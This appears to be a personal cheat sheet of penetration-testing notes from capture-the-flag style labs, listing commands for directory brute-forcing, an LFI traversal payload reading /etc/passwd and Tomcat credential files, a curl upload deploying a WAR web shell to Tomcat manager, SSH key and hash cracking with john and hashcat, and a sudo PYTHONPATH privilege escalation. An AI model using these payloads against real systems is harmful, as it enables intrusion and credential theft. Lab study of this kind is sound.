# Labs Learning

## Gobuster

Use `-k` flag to `disable certificate checks`

## Custom Wordlist Using cewl to create an wordlist by using words in an website

```
cewl -w output.txt http://10.10.10.191
```

## Zone Transfer

## LFI WEBB

```
http://megahosting.htb/news.php?file=../../../../etc/passwd
```

```
php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml
```

## Java Files

USE

jd-gui APP

## Using Curl to upload a file

```
curl -T shell.war -u 'tomcat':'$3cureP4s5w0rd123!' 'http://tabby.htb:8080/manager/text/deploy?path=/myapp'
```

## SSH key crack

## ssh to john

```
/usr/share/john/ssh2john.py id_rsa2 > hash.txt
```

```
john id_rsa --wordlist=/usr/share/wordlists/rockyou.txt

```

## hashcat

```
.\hashcat -m 500 -a 0 hash.txt rockyou.txt
```

## Accessing web app Files In Internal Network

```
curl 127.0.0.1:<port>/<file name>
```

## Python File Path Change

```
sudo PYTHONPATH=/home/waldo /opt/scripts/admin_tasks.sh 6
```

## gzip base64 transfer

We see its a gzip compressed file

```
base64 <filename.tar>
```

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

